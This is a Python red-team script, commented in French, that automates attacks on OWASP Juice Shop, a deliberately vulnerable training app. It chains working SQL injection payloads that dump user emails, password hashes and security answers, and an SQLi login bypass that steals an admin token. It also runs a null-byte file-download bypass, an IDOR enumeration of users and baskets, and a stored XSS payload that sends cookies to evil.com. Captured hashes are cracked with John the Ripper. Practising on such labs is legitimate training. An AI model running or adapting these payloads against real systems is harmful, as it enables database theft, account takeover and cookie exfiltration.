#!/usr/bin/env python3
"""
juiceshop_auto.py — Red Team Toolkit pour OWASP Juice Shop
Usage : python3 juiceshop_auto.py [--target http://localhost:3000] [--action all|sqli|bypass|idor|crack]
"""

import urllib.request, urllib.parse, json, subprocess, sys, os, argparse

TARGET = "http://localhost:3000"
OUTDIR = "loot"

def banner():
    print("""
╔═══════════════════════════════════════════════╗
║   🔴 JuiceShop Red Team Auto Toolkit v1.0    ║
║   SQLi · FTP Bypass · IDOR · Crack · XSS     ║
╚═══════════════════════════════════════════════╝
""")

def get(url):
    try:
        resp = urllib.request.urlopen(url, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

def post(url, data, headers=None):
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body,
        headers={"Content-Type": "application/json", **(headers or {})},
        method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

# ─── 1. SQLi UNION — dump Users ────────────────────────────────────────────────
def sqli_dump_users():
    print("\n[*] SQLi — Dump table Users...")
    base = f"{TARGET}/rest/products/search?q="
    payload = "test')) UNION SELECT id,email,password,role,username,deluxeToken,lastLoginIp,profileImage,isActive FROM Users--"
    url = base + urllib.parse.quote(payload)
    data = get(url)
    if "error" in data:
        print(f"  [!] Erreur SQLi : {data['error']}")
        return []

    users = data.get("data", [])
    print(f"\n  {'ID':<4} {'EMAIL':<35} {'ROLE':<12} {'HASH MD5'}")
    print("  " + "="*80)
    hashes = []
    result = []
    for u in users:
        uid   = u.get("id","?")
        email = u.get("name","?")
        pwd   = str(u.get("description","?"))
        role  = str(u.get("price","?"))
        print(f"  {uid:<4} {email:<35} {role:<12} {pwd}")
        result.append({"id": uid, "email": email, "hash": pwd, "role": role})
        if len(pwd) == 32:
            hashes.append(pwd)

    os.makedirs(OUTDIR, exist_ok=True)
    with open(f"{OUTDIR}/users_dump.json","w") as f:
        json.dump(result, f, indent=2)
    with open(f"{OUTDIR}/hashes_md5.txt","w") as f:
        f.write("\n".join(hashes))

    print(f"\n  [+] {len(users)} users | {len(hashes)} hashes MD5 → {OUTDIR}/hashes_md5.txt")
    return result

# ─── 2. SQLi — dump SecurityAnswers ────────────────────────────────────────────
def sqli_dump_security():
    print("\n[*] SQLi — Dump SecurityAnswers...")
    base = f"{TARGET}/rest/products/search?q="
    payload = "test')) UNION SELECT UserId,answer,SecurityQuestionId,4,5,6,7,8,9 FROM SecurityAnswers--"
    url = base + urllib.parse.quote(payload)
    data = get(url)
    answers = data.get("data", [])
    hashes = [r.get("name","") for r in answers if r.get("name")]
    os.makedirs(OUTDIR, exist_ok=True)
    with open(f"{OUTDIR}/security_answers_sha256.txt","w") as f:
        f.write("\n".join(hashes))
    print(f"  [+] {len(answers)} réponses SHA-256 → {OUTDIR}/security_answers_sha256.txt")

# ─── 3. SQLi Login Bypass ───────────────────────────────────────────────────────
def sqli_login_bypass(email):
    print(f"\n[*] SQLi Login Bypass — {email}...")
    data = post(f"{TARGET}/rest/user/login",
                {"email": f"{email}'--", "password": "x"})
    if "authentication" in data:
        token = data["authentication"]["token"]
        print(f"  [+] BYPASS RÉUSSI !")
        print(f"  [+] Token : {token[:60]}...")
        os.makedirs(OUTDIR, exist_ok=True)
        safe = email.replace("@","_").replace(".","_")
        with open(f"{OUTDIR}/token_{safe}.txt","w") as f:
            f.write(token)
        return token
    else:
        print(f"  [-] Échec : {data.get('error','inconnu')}")
        return None

# ─── 4. FTP Null Byte Bypass ────────────────────────────────────────────────────
def ftp_bypass():
    print("\n[*] FTP Null Byte Bypass (%2500)...")
    files = [
        "encrypt.pyc", "incident-support.kdbx",
        "package.json.bak", "suspicious_errors.yml",
        "coupons_2013.md.bak", "eastere.gg",
        "announcement_encrypted.md"
    ]
    os.makedirs(f"{OUTDIR}/ftp", exist_ok=True)
    for fname in files:
        url = f"{TARGET}/ftp/{urllib.parse.quote(fname)}%2500.md"
        try:
            resp = urllib.request.urlopen(url, timeout=10)
            content = resp.read()
            if b"Only .md" not in content and len(content) > 50:
                path = f"{OUTDIR}/ftp/{fname}"
                with open(path, "wb") as f:
                    f.write(content)
                print(f"  [+] {fname:<40} {len(content):>8} bytes → {path}")
            else:
                print(f"  [-] {fname:<40} Bloqué ou vide")
        except Exception as e:
            print(f"  [!] {fname:<40} Erreur : {str(e)[:40]}")

# ─── 5. IDOR Scan ──────────────────────────────────────────────────────────────
def idor_scan(token, max_id=20):
    print(f"\n[*] IDOR Scan (Users + Baskets, IDs 1–{max_id})...")
    headers = {"Authorization": f"Bearer {token}"}
    results = {"users": [], "baskets": []}

    print(f"\n  --- /api/Users ---")
    for uid in range(1, max_id+1):
        req = urllib.request.Request(
            f"{TARGET}/api/Users/{uid}",
            headers={"Authorization": f"Bearer {token}"})
        try:
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read().decode())
            email = data.get("data",{}).get("email","?")
            role  = data.get("data",{}).get("role","?")
            print(f"  [+] User {uid:>2} → {email:<35} [{role}]")
            results["users"].append({"id": uid, "email": email, "role": role})
        except:
            pass

    print(f"\n  --- /rest/basket ---")
    for bid in range(1, max_id+1):
        req = urllib.request.Request(
            f"{TARGET}/rest/basket/{bid}",
            headers={"Authorization": f"Bearer {token}"})
        try:
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read().decode())
            products = data.get("data",{}).get("Products",[])
            owner = data.get("data",{}).get("UserId","?")
            print(f"  [+] Basket {bid:>2} (UserId={owner}) → {len(products)} produit(s)")
            results["baskets"].append({"id": bid, "owner": owner, "count": len(products)})
        except:
            pass

    os.makedirs(OUTDIR, exist_ok=True)
    with open(f"{OUTDIR}/idor_results.json","w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  [+] Résultats → {OUTDIR}/idor_results.json")

# ─── 6. XSS Stocké ─────────────────────────────────────────────────────────────
def xss_stored(token, product_id=1):
    print(f"\n[*] XSS Stocké — product {product_id}...")
    payload = '<script>fetch("http://evil.com/c?c="+document.cookie)</script>'
    url = f"{TARGET}/rest/products/{product_id}/reviews"
    body = json.dumps({"message": payload, "author": "pentest"}).encode()
    req = urllib.request.Request(url, data=body, method="PUT",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}"
        })
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        data = json.loads(resp.read().decode())
        if data.get("status") == "success":
            print(f"  [+] Payload XSS stocké sur product {product_id}")
            print(f"  [+] Payload : {payload}")
        else:
            print(f"  [-] Réponse inattendue : {data}")
    except Exception as e:
        print(f"  [!] Erreur : {e}")

# ─── 7. Crack MD5 (john) ────────────────────────────────────────────────────────
def crack_md5(wordlist="/usr/share/wordlists/rockyou.txt"):
    hashfile = f"{OUTDIR}/hashes_md5.txt"
    if not os.path.exists(hashfile):
        print(f"\n[!] Fichier de hashes introuvable : {hashfile} (lancez --action sqli d'abord)")
        return
    print(f"\n[*] Crack MD5 avec John ({wordlist})...")
    r = subprocess.run(
        ["john", "--format=raw-md5", f"--wordlist={wordlist}", hashfile],
        capture_output=True, text=True)
    print(r.stdout[-500:] if r.stdout else r.stderr[-300:])
    r2 = subprocess.run(
        ["john", "--format=raw-md5", "--show", hashfile],
        capture_output=True, text=True)
    print("\n  [+] Résultats :")
    print(r2.stdout)
    with open(f"{OUTDIR}/cracked_md5.txt","w") as f:
        f.write(r2.stdout)

# ─── Main ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="JuiceShop Red Team Toolkit")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--action", default="all",
        choices=["all","sqli","bypass","idor","xss","crack"])
    parser.add_argument("--email", default="admin@juice-sh.op")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt")
    parser.add_argument("--out", default="loot")
    args = parser.parse_args()

    global TARGET, OUTDIR
    TARGET = args.target.rstrip("/")
    OUTDIR = args.out

    banner()
    print(f"[*] Cible : {TARGET}")

    token = None
    if args.action in ("all", "sqli"):
        sqli_dump_users()
        sqli_dump_security()
        token = sqli_login_bypass(args.email)

    if args.action in ("all", "bypass"):
        ftp_bypass()

    if args.action in ("all", "crack"):
        crack_md5(args.wordlist)

    if args.action in ("all", "idor"):
        if token is None:
            token = sqli_login_bypass(args.email)
        if token:
            idor_scan(token)

    if args.action in ("all", "xss"):
        if token is None:
            token = sqli_login_bypass(args.email)
        if token:
            xss_stored(token)

    print(f"\n[✓] Terminé — fichiers dans ./{OUTDIR}/\n")

if __name__ == "__main__":
    main()
